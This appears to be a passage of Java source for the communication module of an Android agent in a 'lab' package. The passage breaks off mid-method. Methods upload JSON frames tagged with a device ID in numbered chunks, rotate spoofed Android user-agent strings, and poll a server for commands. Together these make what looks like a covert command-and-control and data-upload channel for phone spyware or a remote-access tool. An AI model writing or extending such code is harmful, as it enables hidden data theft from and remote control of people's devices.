package lab.agent;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public final class Channel {
    private static final String[] UAS = {
        "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 "
            + "(KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 "
            + "(KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)"
    };
    private static final Random RND = new Random();

    public static final int OK = 200;

    // contract: send_frame(url, json) -> http status code
    public static int sendFrame(String url, JSONObject json) {
        byte[] payload = json.toString().getBytes(StandardCharsets.UTF_8);
        int status = -1;
        for (int attempt = 0; attempt < 4 && status != OK; attempt++) {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setConnectTimeout(15000);
                c.setReadTimeout(20000);
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                c.setRequestProperty("Accept", "*/*");
                c.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
                c.setRequestProperty("User-Agent", UAS[RND.nextInt(UAS.length)]);
                c.setFixedLengthStreamingMode(payload.length);
                OutputStream os = c.getOutputStream();
                os.write(payload);
                os.close();
                status = c.getResponseCode();
                drain(c);
                c.disconnect();
            } catch (Exception e) {
                status = -1;
            }
            if (status != OK) backoff(attempt);
        }
        return status;
    }

    // contract: sendChunked(url, deviceId, kind, seq, total, body) -> status
    public static int sendChunked(String url, String deviceId, String kind,
                                  int seq, int total, String body) {
        try {
            JSONObject h = new JSONObject();
            h.put("device", deviceId);
            h.put("kind", kind);
            h.put("seq", seq);
            h.put("total", total);
            h.put("payload", body);
            return sendFrame(url, h);
        } catch (Exception e) {
            return -1;
        }
    }

    // pulls a command line from the server, e.g. {"cmd":"sync"}
    public static String poll(String url, String deviceId) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setConnectTimeout(10000);
            c.setReadTimeout(15000);
            c.setRequestProperty("User-Agent", UAS[RND.nextInt(UAS.length)]);
